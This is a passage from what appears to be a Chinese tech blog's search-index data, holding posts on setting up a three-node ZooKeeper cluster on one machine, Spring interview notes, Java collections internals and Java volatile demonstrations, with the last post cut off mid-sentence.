是一个高效的分布式协调服务，可以提供配置信息管理、命名、分布式同步、集群管理、数据库切换等服务。它不适合用来存储大量信息，可以用来存储一些配置、发布与订阅等少量信息。Hadoop、Storm、消息中间件、RPC 服务框架、分布式数据库同步系统，这些都是 Zookeeper 的应用场景。 Zookeeper 集群简介在 Linux 单机上搭建 Zookeeper 集群，至少需要三个节点。 角色划分Zookeeper 集群有三种角色划分，分别是 leader、follower、observer： 领导者（leader）：负责进行投票的发起和决议，更新系统状态。 跟随者（follower）：用于接收客户端请求，并向客户端返回结果，以及在选举过程中参与投票 观察者（observer）：可以接收客户端连接，将写请求转发给 leader 节点，但是不参与投票过程，只同步 leader 的状态，通常用作对查询操作做负载。 端口作用 2181：对客户端端提供服务 2888: 集群内机器相互通信使用 3888: 选举 leader 使用 Zookeeper 集群搭建集群规划 节点 IP 地址 端口 版本号 节点 1 127.0.0.1 2181, 2881, 3881 3.4.10 节点 2 127.0.0.1 2182, 2882, 3882 3.4.10 节点 3 127.0.0.1 2183, 2883, 3883 3.4.10 集群搭建 Zookeeper 下载 Zookeeper 的最新版本可以从 官网 下载，历史版本则可以从 这里 下载。 Zookeeper 安装 1234567891011121314151617# 创建安装目录# mkdir -p /usr/local/zookeeper-cluster# 进入安装目录# cd /usr/local/zookeeper-cluster# 下载压缩包# wget https://archive.apache.org/dist/zookeeper/zookeeper-3.4.10/zookeeper-3.4.10.tar.gz# 解压文件# tar -xvf zookeeper-3.4.10.tar.gz# 重命名目录# mv zookeeper-3.4.10 zookeeper-node-1# 删除压缩包# rm -rf zookeeper-3.4.10.tar.gz Zookeeper 配置 1234567891011121314# 进入安装目录# cd /usr/local/zookeeper-cluster/zookeeper-node-1# 创建数据存储目录# mkdir data# 创建日志存储目录# mkdir logs# 复制配置文件# cp conf/zoo_sample.cfg conf/zoo.cfg# 编辑配置文件（指定以下内容即可）# vim conf/zoo.cfg 123456789# 基础配置clientPort=2181dataDir=/usr/local/zookeeper-cluster/zookeeper-node-1/datadataLogDir=/usr/local/zookeeper-cluster/zookeeper-node-1/logs# 集群配置server.1=127.0.0.1:2881:3881server.2=127.0.0.1:2882:3882server.3=127.0.0.1:2883:3883 提示 server.1=127.0.0.1:2881:3881，分别对应 server.serverid=host:tickpot:electionport serverid：是一个数字，表示这是第几号服务器。下文提到的 myid 文件里面有一个数据就是它的值。Zookeeper 启动时会读取该文件，然后拿到里面的数据与 zoo.cfg 里面的配置信息比较，从而判断当前节点是哪个 server host：服务器的地址，即主机名 / IP 地址 tickpot：服务器 Follower 与集群中的 Leader 服务器交换信息的端口 electionport：用来执行选举时服务器相互通信的端口 Zookeeper 创建 myid 文件 在 Zookeeper 的 data 目录下创建 myid 文件，文件内容是是 1（服务器编号）。 12# 创建myid文件，并写入数据# echo "1" &gt; /usr/local/zookeeper-cluster/zookeeper-node-1/data/myid 注意 myid 文件里的服务器编号可以自定义（全局唯一），但是上下不要有空行，左右不要有空格。 Zookeeper 创建多个节点 复制两份上面已经配置好的 Zookeeper 安装目录，以此作为集群中另外两个节点的安装文件，例如 zookeeper-node-2 和 zookeeper-node-3。安装目录复制完成后，还需要更改每个新节点里的 zoo.cfg 配置文件的 clientPort、dataDir、dataLogDir，并重新指定 myid 文件里的服务器编号。另外两个节点的配置内容如下所示： 1234567# 节点二的zoo.cfg文件clientPort=2182dataDir=/usr/local/zookeeper-cluster/zookeeper-node-2/datadataLogDir=/usr/local/zookeeper-cluster/zookeeper-node-2/logs# 节点二的myid文件# echo "2" &gt; /usr/local/zookeeper-cluster/zookeeper-node-2/data/myid 1234567# 节点三的zoo.cfg文件clientPort=2183dataDir=/usr/local/zookeeper-cluster/zookeeper-node-3/datadataLogDir=/usr/local/zookeeper-cluster/zookeeper-node-3/logs# 节点三的myid文件# echo "3" &gt; /usr/local/zookeeper-cluster/zookeeper-node-3/data/myid 集群管理管理命令值得一提的是，Zookeeper 的管理命令（Shell 脚本）都在对应安装目录的 bin 目录下。 12345678# 启动服务# ./zkServer.sh start# 关闭服务# ./zkServer.sh stop# 查看服务状态# ./zkServer.sh status 或者指定配置文件进行操作： 12345678# 启动服务# ./zkServer.sh start ../conf/zoo.cfg # 关闭服务# ./zkServer.sh stop ../conf/zoo.cfg # 查看服务状态# ./zkServer.sh status ../conf/zoo.cfg 集群启动 启动集群 123# /usr/local/zookeeper-cluster/zookeeper-node-1/bin/zkServer.sh start# /usr/local/zookeeper-cluster/zookeeper-node-2/bin/zkServer.sh start# /usr/local/zookeeper-cluster/zookeeper-node-3/bin/zkServer.sh start 查看状态 123# /usr/local/zookeeper-cluster/zookeeper-node-1/bin/zkServer.sh status# /usr/local/zookeeper-cluster/zookeeper-node-2/bin/zkServer.sh status# /usr/local/zookeeper-cluster/zookeeper-node-3/bin/zkServer.sh status 集群正常启动后，各个节点输出的日志信息如下，此时集群的 Leader 是节点二 123456789101112131415ZooKeeper JMX enabled by defaultUsing config: /usr/local/zookeeper-cluster/zookeeper-node-1/bin/../conf/zoo.cfgMode: follower-------------------------------------------------------------------------------ZooKeeper JMX enabled by defaultUsing config: /usr/local/zookeeper-cluster/zookeeper-node-2/bin/../conf/zoo.cfgMode: leader-------------------------------------------------------------------------------ZooKeeper JMX enabled by defaultUsing config: /usr/local/zookeeper-cluster/zookeeper-node-3/bin/../conf/zoo.cfgMode: follower 关闭集群 123# /usr/local/zookeeper-cluster/zookeeper-node-1/bin/zkServer.sh stop# /usr/local/zookeeper-cluster/zookeeper-node-2/bin/zkServer.sh stop# /usr/local/zookeeper-cluster/zookeeper-node-3/bin/zkServer.sh stop 清空数据 若希望清空 Zookeper 集群的数据，则可以先关闭集群，然后再删除 Zookeeper 安装目录下的 data 和 logs 子目录下的数据文件（不包括 myid 文件）即可。清空数据的操作不可恢复，生产环境下慎用。 123456# rm -rf /usr/local/zookeeper-cluster/zookeeper-node-1/data/version-2# rm -rf /usr/local/zookeeper-cluster/zookeeper-node-1/logs/version-2# rm -rf /usr/local/zookeeper-cluster/zookeeper-node-2/data/version-2# rm -rf /usr/local/zookeeper-cluster/zookeeper-node-2/logs/version-2# rm -rf /usr/local/zookeeper-cluster/zookeeper-node-3/data/version-2# rm -rf /usr/local/zookeeper-cluster/zookeeper-node-3/logs/version-2 测试集群数据同步测试 连接节点一，并创建文件夹 12345678910# 连接节点一# ./zkCli.sh -server 127.0.0.1:2181# 创建文件夹[zk: 127.0.0.1:2181(CONNECTED) 3] create /test ""Created /test# 查看目录信息[zk: 127.0.0.1:2181(CONNECTED) 4] ls /[zookeeper, test] 此时连接其他任意节点，可以发现 test 文件夹会同步创建，即在任何一个集群节点进行操作，其他集群节点也会同步更新。 123456# 连接节点二# ./zkCli.sh -server 127.0.0.1:2182# 查看目录信息[zk: 127.0.0.1:2182(CONNECTED) 0] ls /[zookeeper, test] 宕机重新选举测试 关闭 Leader（节点二） 1# /usr/local/zookeeper-cluster/zookeeper-node-2/bin/zkServer.sh stop 查看其他节点的状态（节点一、节点三） 12# /usr/local/zookeeper-cluster/zookeeper-node-1/bin/zkServer.sh status# /usr/local/zookeeper-cluster/zookeeper-node-3/bin/zkServer.sh status 关闭 Leader（节点二），等待超时时间到了之后，重新查看各个节点的状态，会发现节点三被选举为新的 Leader。 123456789ZooKeeper JMX enabled by defaultUsing config: /usr/local/zookeeper-cluster/zookeeper-node-1/bin/../conf/zoo.cfgMode: follower-------------------------------------------------------------------------------ZooKeeper JMX enabled by defaultUsing config: /usr/local/zookeeper-cluster/zookeeper-node-3/bin/../conf/zoo.cfgMode: leader 参考博客 Linux 下单机实现 Zookeeper 集群 Linux 下搭建单机 Zookeeper 集群 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"linux"},{title:"Spring 面试题之一",url:"/posts/16617d7.html",text:'Spring 基础Spring Bean 的五个作用域 类别 说明 singleton Spring IOC 容器一开始就会实例化该 Bean，且在整个 Spring IOC 容器中，使用 singleton 定义的 Bean 将只有一个实例 prototype Spring IOC 容器一开始不会实例化该 Bean，而是每次通过容器的 getBean () 方法获取 prototype 定义的 Bean 时，都将产生一个新的 Bean 实例 request 对于每次 HTTP 请求，使用 request 定义的 Bean 都将产生一个新实例，即每次 HTTP 请求将会产生不同的 Bean 实例，只有在 Web 应用中使用 Spring 时，该作用域才有效 session 对于每次 HTTP Session，使用 session 定义的 Bean 都将产生一个新实例，同样只有在 Web 应用中使用 Spring 时，该作用域才有效 globalsession 每个全局的 HTTP Session，使用 session 定义的 Bean 都将产生一个新实例，同样只有在 Web 应用中使用 Spring 时，该作用域才有效 其中比较常用的是 singleton 和 prototype 两种作用域。对于 singleton 作用域的 Bean，每次请求该 Bean 都将获得相同的实例，容器负责跟踪 Bean 实例的状态，负责维护 Bean 实例的生命周期；如果一个 Bean 被设置成 prototype 作用域，程序每次请求该 id 的 Bean 时，Spring 都会新建一个 Bean 实例，然后返回给程序。在这种情况下，Spring 容器仅仅使用 new 关键字创建 Bean 实例，一旦创建成功，容器不在跟踪实例，也不会维护 Bean 实例的状态。如果不指定 Bean 的作用域，Spring 默认使用 singleton 作用域。Java 在创建实例时，需要进行内存申请；销毁实例时，需要完成垃圾回收，这些工作都会导致系统开销的增加。因此，prototype 作用域下 Bean 的创建、销毁代价比较大；而 singleton 作用域的 Bean 实例一旦创建成功，可以重复使用。因此，除非必要，应尽量避免将 Bean 被设置成 prototype 作用域。 Spring MVCSpring MVC 中解决请求乱码解决 POST 请求乱码12345678910111213141516171819202122&lt;!-- 配置SpringVMC的字符编码过滤器 --&gt;&lt;filter&gt; &lt;filter-name&gt;encoding&lt;/filter-name&gt; &lt;filter-class&gt;org.springframework.web.filter.CharacterEncodingFilter&lt;/filter-class&gt; &lt;init-param&gt; &lt;param-name&gt;encoding&lt;/param-name&gt; &lt;param-value&gt;utf-8&lt;/param-value&gt; &lt;/init-param&gt; &lt;init-param&gt; &lt;param-name&gt;forceRequestEncoding&lt;/param-name&gt; &lt;param-value&gt;true&lt;/param-value&gt; &lt;/init-param&gt; &lt;init-param&gt; &lt;param-name&gt;forceResponseEncoding&lt;/param-name&gt; &lt;param-value&gt;true&lt;/param-value&gt; &lt;/init-param&gt; &lt;/filter&gt; &lt;filter-mapping&gt; &lt;filter-name&gt;encoding&lt;/filter-name&gt; &lt;url-pattern&gt;/*&lt;/url-pattern&gt; &lt;/filter-mapping&gt; 解决 GET 请求乱码方法一，通过 Java 代码手动指定字符编码： 1String name = new String (resuest.getParameter("name").getBytes("ISO8859-1"), utf-8); 方法二，通过配置 Tomcat 的 server.xml 配置文件指定字符编码： 1&lt;Connector connectionTimeout="20000" port="8080" protocol="HTTP/1.1" redirectPort="8443" URIEncoding="UTF-8"/&gt; Spring MVC 的工作流程Spring MVC 处理模型数据 处理模型数据的方式一：将 Controller 中方法的返回值设置为 ModelAndView 处理模型数据的方式二：将 Controller 中方法的返回值设置为 String，在方法的入参中传入 Map、Model 或者 ModelMap 上述的两种方式，最终都会被 Spring MVC 转换为一个 ModelAndView 对象 Spring MVC 工作原理图 Spring MVC 工作流程Spring MVC 各组件 DispatcherServlet：中央控制器，也称为前端控制器，它是整个请求响应的控制中心，组件的调用由它统一调度 HandlerMapping：处理器映射器，它根据用户访问的 URL 映射到对应的后端处理器 Handler。也就是说它知道处理用户请求的后端处理器，但是它并不执行后端处理器，而是将后端处理器告诉给中央处理器 HandlerAdapter：处理器适配器，它调用后端处理器中的方法，返回逻辑视图 ModelAndView 对象 ViewResolver：视图解析器，将 ModelAndView 逻辑视图解析为具体的视图（如 JSP） Handler：后端处理器，对用户具体请求进行处理，也就是 Controller 类 Spring MVC 的工作流程： 1）用户向服务端发送一次请求，这个请求会先到中央控制器 DispatcherServlet（前端控制器） 2）DispatcherServlet 接收到请求后会调用 HandlerMapping 处理器映射器。由此得知，该请求该由哪个 Controller 来处理（此时并未调用 Controller，只是得知） 3）DispatcherServlet 调用 HandlerAdapter 处理器适配器，告诉处理器适配器应该要去执行哪个 Controller 4）HandlerAdapter 处理器适配器去执行 Controller 并得到 ModelAndView （数据和视图），并层层返回给 DispatcherServlet 5）DispatcherServlet 将 ModelAndView 交给 ViewReslover 视图解析器解析，然后返回真正的视图 6）DispatcherServlet 将模型数据填充到视图中 7）DispatcherServlet 将结果响应给用户 Spring 数据库事务Spring 的七种事务传播行为当事务方法被另一个事务方法调用时，必须指定事务应该如何传播。例如：方法可能在现有的事务中运行，也可能开启一个新的事务，并在自己的事务中运行。Spring 定义了七种事务传播行为，默认的事务传播行为是 PROPAGATION_REQUIRED。 传播行为 说明 PROPAGATION_REQUIRED 如果存在一个事务，则支持当前事务；如果没有事务则开启 PROPAGATION_SUPPORTS 如果存在一个事务，支持当前事务；如果没有事务，则非事务的执行 PROPAGATION_MANDATORY 如果已经存在一个事务，支持当前事务；如果没有一个活动的事务，则抛出异常 PROPAGATION_REQUIRES_NEW 总是开启一个新的事务；如果一个事务已经存在，则将这个存在的事务挂起 PROPAGATION_NOT_SUPPORTED 总是非事务地执行，并挂起任何存在的事务 PROPAGATION_NEVER 总是非事务地执行，如果存在一个活动事务，则抛出异常 PROPAGATION_NESTED 如果有一个活动的事务存在，则运行在一个嵌套的事务中；如果没有活动事务，则按 PROPAGATION_REQUIRED 执行 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"面试"},{title:"Java 集合类面试题之一",url:"/posts/cc846db2.html",text:'集合类基础常见的集合类有哪些Map 接口和 Collection 接口是所有集合框架的父接口，其中 Collection 接口的子接口包括 Set 接口和 List 接口： Set 接口的实现类主要有：HashSet、TreeSet、LinkedHashSet 等 List 接口的实现类主要有：ArrayList、LinkedList、Stack、Vector 等 Map 接口的实现类主要有：HashMap、TreeMap、HashTable、ConcurrentHashMap 以及 Properties 等 HashMap 与 HashTable 的区别 HashMap 允许 K/V 都为 Null，Hashtable 规定 K/V 都不允许为 Null HashMap 继承自 AbstractMap 类，而 HashTable 继承自 Dictionary 类 HashMap 没有考虑同步，是线程不安全的；Hashtable 使用了 synchronized 关键字，是线程安全的 集合类源码分析HashMap 的 Put 方法的具体流程 ★展开源代码★ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061final V putVal(int hash, K key, V value, boolean onlyIfAbsent, boolean evict) { HashMap.Node&lt;K, V&gt;[] tab; HashMap.Node&lt;K, V&gt; p; int n, i; // 1.如果table为空或者长度为0，即没有元素，那么使用resize()方法扩容 if ((tab = table) == null || (n = tab.length) == 0) n = (tab = resize()).length; // 2.计算插入存储的数组索引i，此处计算方法同 1.7 中的indexFor()方法 // 如果数组为空，即不存在Hash冲突，则直接插入数组 if ((p = tab[i = (n - 1) &amp; hash]) == null) tab[i] = newNode(hash, key, value, null); // 3.插入时，如果发生Hash冲突，则依次往下判断 else { HashMap.Node&lt;K, V&gt; e; K k; // a.判断table[i]的元素的key是否与需要插入的key一样，若相同则直接用新的value覆盖掉旧的value // 判断原则equals() - 所以需要当key的对象重写该方法 if (p.hash == hash &amp;&amp; ((k = p.key) == key || (key != null &amp;&amp; key.equals(k)))) e = p; // b.继续判断：需要插入的数据结构是红黑树还是链表 // 如果是红黑树，则直接在树中插入 or 更新键值对 else if (p instanceof HashMap.TreeNode) e = ((HashMap.TreeNode&lt;K, V&gt;) p).putTreeVal(this, tab, hash, key, value); // 如果是链表，则在链表中插入 or 更新键值对 else { // i .遍历table[i]，判断key是否已存在：采用equals对比当前遍历结点的key与需要插入数据的key // 如果存在相同的，则直接覆盖 // ii.遍历完毕后任务发现上述情况，则直接在链表尾部插入数据 // 插入完成后判断链表长度是否 &gt; 8：若是，则把链表转换成红黑树 for (int binCount = 0; ; ++binCount) { if ((e = p.next) == null) { p.next = newNode(hash, key, value, null); if (binCount &gt;= TREEIFY_THRESHOLD - 1) // -1 for 1st treeifyBin(tab, hash); break; } if (e.hash == hash &amp;&amp; ((k = e.key) == key || (key != null &amp;&amp; key.equals(k)))) break; p = e; } } // 对于i 情况的后续操作：发现key已存在，直接用新value覆盖旧value&amp;返回旧value if (e != null) { // existing mapping for key V oldValue = e.value; if (!onlyIfAbsent || oldValue == null) e.value = value; afterNodeAccess(e); return oldValue; } } ++modCount; // 插入成功后，判断实际存在的键值对数量size &gt; 最大容量 // 如果大于则进行扩容 if (++size &gt; threshold) resize(); // 插入成功时会调用的方法（默认实现为空） afterNodeInsertion(evict); return null;} HashMap 的扩容操作如何实现的 ★展开源代码★ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283/** * 该方法有两种使用情况：1.初始化哈希表；2.当前数组容量过小，需要扩容 */final Node&lt;K, V&gt;[] resize() { Node&lt;K, V&gt;[] oldTab = table;// 扩容前的数组（当前数组） int oldCap = (oldTab == null) ? 0 : oldTab.length;// 扩容前的数组容量（数组长度） int oldThr = threshold;// 扩容前数组的阈值 int newCap, newThr = 0; if (oldCap &gt; 0) { // 针对情况2：若扩容前的数组容量超过最大值，则不再扩容 if (oldCap &gt;= MAXIMUM_CAPACITY) { threshold = Integer.MAX_VALUE; return oldTab; } // 针对情况2：若没有超过最大值，就扩容为原来的2倍（左移1位） else if ((newCap = oldCap &lt;&lt; 1) &lt; MAXIMUM_CAPACITY &amp;&amp; oldCap &gt;= DEFAULT_INITIAL_CAPACITY) newThr = oldThr &lt;&lt; 1; // double threshold } // 针对情况1：初始化哈希表（采用指定或者使用默认值的方式） else if (oldThr &gt; 0) // initial capacity was placed in threshold newCap = oldThr; else { // zero initial threshold signifies using defaults newCap = DEFAULT_INITIAL_CAPACITY; newThr = (int) (DEFAULT_LOAD_FACTOR * DEFAULT_INITIAL_CAPACITY); } // 计算新的resize上限 if (newThr == 0) { float ft = (float) newCap * loadFactor; newThr = (newCap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; (float) MAXIMUM_CAPACITY ? (int) ft : Integer.MAX_VALUE); } threshold = newThr; @SuppressWarnings({"rawtypes", "unchecked"}) Node&lt;K, V&gt;[] newTab = (Node&lt;K, V&gt;[]) new Node[newCap]; table = newTab; if (oldTab != null) { // 把每一个bucket都移动到新的bucket中去 for (int j = 0; j &lt; oldCap; ++j) { Node&lt;K, V&gt; e; if ((e = oldTab[j]) != null) { oldTab[j] = null; if (e.next == null) newTab[e.hash &amp; (newCap - 1)] = e; else if (e instanceof TreeNode) ((TreeNode&lt;K, V&gt;) e).split(this, newTab, j, oldCap); else { // preserve order Node&lt;K, V&gt; loHead = null, loTail = null; Node&lt;K, V&gt; hiHead = null, hiTail = null; Node&lt;K, V&gt; next; do { next = e.next; if ((e.hash &amp; oldCap) == 0) { if (loTail == null) loHead = e; else loTail.next = e; loTail = e; } else { if (hiTail == null) hiHead = e; else hiTail.next = e; hiTail = e; } } while ((e = next) != null); if (loTail != null) { loTail.next = null; newTab[j] = loHead; } if (hiTail != null) { hiTail.next = null; newTab[j + oldCap] = hiHead; } } } } } return newTab;} 集合类的线程安全性集合类的非线程安全问题问题：普通的集合类是非线程安全的，请编写一个线程不安全的使用案例并给出解决方案 ★展开案例代码★ 12345678910111213public class ArrayListUnSafe { public static void main(String[] args) { List&lt;String&gt; list = new ArrayList&lt;&gt;(); for (int i = 0; i &lt; 10; i++) { new Thread(() -&gt; { list.add(UUID.randomUUID().toString().substring(0, 8)); System.out.println(list); }).start(); } }} 1运行结果可能会抛出 java.util.ConcurrentModificationException 异常 回答： 第一方法：使用 Vector 替代 ArrayList，即 List&lt;String&gt; list = new Vector&lt;&gt;(); 第二种方法：使用 Collectons 类，即 List&lt;String&gt; list = Collections.synchronizedList(new ArrayList()); 第三种方法：使用 CopyOnWriteArrayList 类，即 List&lt;String&gt; list = new CopyOnWriteArrayList&lt;&gt;(); 集合类的写时复制（CopyOnWrite）写时复制（CopyOnWrite）介绍CopyOnWrite 容器即写时复制的容器。往一个容器添加元素的时候，不直接往当前容器的 Object[] 添加，而是先将当前 Object[] 进行 Copy，复制出一个新的容器 Object[] newElements，然后新的容器 Object[] newElements 里添加元素，添加完元素之后，再将原容器的引用指向新的容器（setArray（newElements））。这样做的好处是可以对 CopyOnWrite 容器进行并发的读，而不需要加锁，因为当前容器不会添加任何元素。所以 CopyOnWrite 容器也是一种读写分离的思想，读和写的是不同的容器。JDK 8 的 CopyOnWriteArrayList 的源码如下： 写时复制（CopyOnWrite）优缺点应用场景：应用于读多写少的并发场景使用注意：为了减少扩容开销，尽量使用批量添加（减少复制次数）缺点：存在内存占用问题、数据一致性问题（CopyOnWrite 机制只能保证最终的数据一致，不能保证实时数据的强一致性，因此如果希望写入的数据能马上能读到，此时就不应该使用 CopyOnWrite） 线程安全的集合类总结 CopyOnWriteArrayList：CopyOnWriteArrayList 中的 add、set、remove 等方法，都是用了 ReentrantLock 的 lock() 来加锁，unlock() 来解锁。当增加元素时使用 Array.copyOf() 来拷贝副本，在副本上增加元素，然后改变原引用指向副本，读操作不加锁，适合读操作远远多于写操作的应用。 CopyOnWriteArraySet：CopyOnWriteArraySet 是在 CopyOnWriteArrayList 的基础上使用了 Java 的装饰模式，底层还是使用 CopyOnWriteArrayList 来实现。List 和 Set 的区别同样适用于 CopyOnWriteArrayList 和 CopyOnWriteArraySet。 ConcurrentHashMap：ConcurrentHashMap 是 HashMap 的线程安全版（但此类不允许 Null 做键或者值），同 HashTable 相比，ConcurrentHashMap 不仅保证了访问的线程安全性，而且在效率上与 HashTable 相比有较大的提高。ConcurrentHashMap 允许多个修改操作并发进行，底层使用了锁分离的技术，即代码块锁，而不是方法锁。其中使用了多个锁来控制对 HashTable 的不同部分进行的修改。ConcurrentHashMap 内部使用段（Segment）来表示不同的部分，每个段其实就是一个小的 HashTable，它们有自己的锁（使用 ReentrantLock 来实现）。只要多个修改发生在不同的段上，它们就可以并发进行。 总结： HashMap 是非线程安全的，HashTable 是线程安全的 LinkedList、ArrayList、HashSet 是非线程安全的，Vector 是线程安全的 ConcurrentHashMap、CopyOnWriteArrayList、CopyOnWriteArraySet 是线程安全的，这几个都是 java.util.concurrent 包提供的并发线程安全的集合类 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"面试"},{title:"Java 多线程面试题之一",url:"/posts/1f270e10.html",text:'谈谈对 Volatile 的理解Volatile 的特性Volatile 是 Java 虚拟机提供的轻量级的同步机制，具有以下三大特性： 保证可见性 不保证原子性 禁止指令重排 Java 内存模型JMM（Java 内存模型，简称 JMM）本身是一种抽象的概念并不真实存在，它描述的是一组规则或规范，通过这组规范定义了程序中各个变量（包括实例字段、静态字段和构成数组对象的元素）的访问方式，即屏蔽掉 Java 程序在各种不同的硬件和操作系统对内存的访问的差异，这样就可以实现 Java 程序在各种不同的平台上都能达到内存访问的一致性。 JMM 关于同步的规定如下： 1）线程解锁前，必须把共享变量的值刷新回主内存 2）线程加锁前，必须读取主内存的最新值到自己的工作内存 3）加锁解锁是同一把锁 由于 JVM 运行程序的实体是线程，而每个线程创建时 JVM 都会为其创建一个工作内存（有些地方称为栈空间），工作内存是每个线程的私有数据区域，而在 Java 内存模型中规定所有变量都存储到主内存，主内存是共享内存区域，所有线程都可以访问，但线程对变量的操作（读取、复制等）必须在工作内存中进行。首先要将变量从主内存拷贝到自己的工作内存空间，然后对变量进行操作，操作完成后再将变量写回主内存，不能直接操作主内存中的变量，各个线程中的工作内存中存储着主内存中的变量副本拷贝，因此不同的线程间无法访问对方的工作内存，线程间的通信（传值）必须通过主内存来完成，其简要访问过程如下图： Java 内存模型的特性Java 内存模型围绕着并发过程中如何处理原子性、可见性和有序性这三个特征来设计的。 原子性（Atomicity）： 由 Java 内存模型来直接保证原子性的变量操作包括 read、load、use、assign、store、write 这六种操作，虽然存在 long 和 double 的特例，但基本可以忽略不计，目前虚拟机基本都对其实现了原子性。如果需要更大范围的控制，lock 和 unlock 也可以满足需求。lock 和 unlock 虽然没有被虚拟机直接提供给用户使用，但是提供了字节码层次的指令 monitorenter 和 monitorexit 对应这两个操作，对应到 Java 代码就是 synchronized 关键字，因此在 synchronized 块之间的代码都具有原子性。 可见性（Visibility）： 可见性是指一个线程修改了一个变量的值后，其他线程立即可以感知到这个值的修改。正如前面所说，volatile 类型的变量在修改后会立即同步给主内存，在使用的时候会从主内存重新读取，是依赖主内存为中介来保证多线程下变量对其他线程的可见性的。除了 volatile 之外，synchronized 和 final 也可以实现可见性。synchronized 关键字是通过 unlock 之前必须把变量同步回主内存来实现的，final 则是在初始化后就不会更改，所以只要在初始化过程中没有把 this 指针传递出去也能保证对其他线程的可见性。 有序性： 有序性从不同的角度来看是不同的。单纯单线程来看都是有序的，但到了多线程就会跟我们预想的不一样。可以这么说：如果在本线程内部观察，所有操作都是有序的；如果在一个线程中观察另一个线程，所有的操作都是无序的。前半句说的就是线程内表现为串行的语义，后半句指的是指令重排现象和主内存与工作内存之间同步存在延迟的现象。保证有序性的关键字有 volatile 和 synchronized，其中 volatile 禁止了指令重排序，而 synchronized 则由一个变量在同一时刻只能被一个线程对其进行 lock 操作来保证。 总结：synchronized 对三种特性都有支持，虽然简单，但是如果无控制地滥用对性能就会产生较大影响。 Java 内存模型的可见性问题各个线程对主内存中共享变量的操作，其本质都是各个线程各自拷贝共享变量到自己的工作内存中进行操作后再写回主内存中的。这就可能存在一个线程 A 修改了共享变量 X 的值但还未写回主内存时，另一个线程 B 又对主内存中同一个共享变量 X 进行操作，但此时 A 线程工作内存中的共享变量 X 对线程 B 来说并不是可见的，这种工作内存与主内存同步存在延迟现象就会造成可见性问题。此时可以使用 synchronized 或 volatile 关键字解决该问题，两者都可以使一个线程修改后的变量立即对其他线程可见。 Volatile 的验证代码Volatile 保证可见性的验证代码 ★展开代码★ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849/** * 1 验证volatile的可见性 * 1.1 加入int number=0，number变量之前没有添加volatile关键字修饰，没有可见性 * 1.2 添加了volatile关键字，可以解决可见性问题 */ public class VolatileDemo { public static void main(String[] args) { MyData data = new MyData(); new Thread(() - &gt; { System.out.println(Thread.currentThread().getName() + " thread come in"); try { TimeUnit.SECONDS.sleep(3); } catch(InterruptedException e) { e.printStackTrace(); } data.setNumber(); System.out.println(Thread.currentThread().getName() + " thread set number is " + data.number); }, "AAA").start(); while(data.number == 0) { // main线程一直在这里循环等待，直到number的值不再等于零 } System.out.println(Thread.currentThread().getName() + " thread is over, the number is " + data.number); } } class MyData { // int number = 0; // volatile可以保证可见性，即可以及时通知其他线程，主内存中的变量值已经被修改 volatile int number = 0; public void setNumber() { this.number = 60; } } 123AAA thread come inAAA thread set number is 60main thread is over, the number is 60 Volatile 不保证原子性的验证代码Volatile 不保证原子性，这里的原子性是指不可分割，完整性，即某个线程正在做某个具体业务时，中间不可以被加塞或者被分割；需要整体完整，要么同时成功，要么同时失败。基于 Volatile 变量的运算在并发下不是线程安全的。Volatile 的规则保证了 read、load、use 的顺序和连续性，同理 assign、store、write 也是顺序和连续的。也就是这几个动作是原子性的，但是对变量的修改，或者对变量的运算，却不能保证是原子性的。如果对变量的修改是分为多个步骤的，那么多个线程同时从主内存拿到的值是最新的，但是经过多步运算后回写到主内存的值是有可能存在覆盖情况发生的。 ★展开代码★ 1234567891011121314151617181920212223242526272829303132333435363738/** * 1. 验证volatile不保证原子性 */ public class VolatileDemo2 { public static void main(String[] args) { MyData2 data = new MyData2(); for(int i = 0; i &lt; 20; i++) { new Thread(() - &gt; { for(int j = 0; j &lt; 1000; j++) { data.add(); } }).start(); } while(Thread.activeCount() &gt; 1) { Thread.yield(); } System.out.println("the number is " + data.number); } } class MyData2 { volatile int number = 0; public void add() { this.number++; } } 1the number is 15386 上述代码就是对 volatile 类型的变量启动了 20 个线程，每个线程对变量执行 1000 次加 1 操作，如果 volatile 变量并发操作没有问题的话，那么结果应该是输出 20000，但是运行结果每次大概率都是小于 20000，这就是因为 number++ 操作不是原子性的（图解），是分多个步骤完成的。假设两个线程 a、b 同时取到了主内存的值是 0，这是没有问题的，在进行 ++ 操作的时候假设线程 a 执行到一半，线程 b 执行完了，这时线程 b 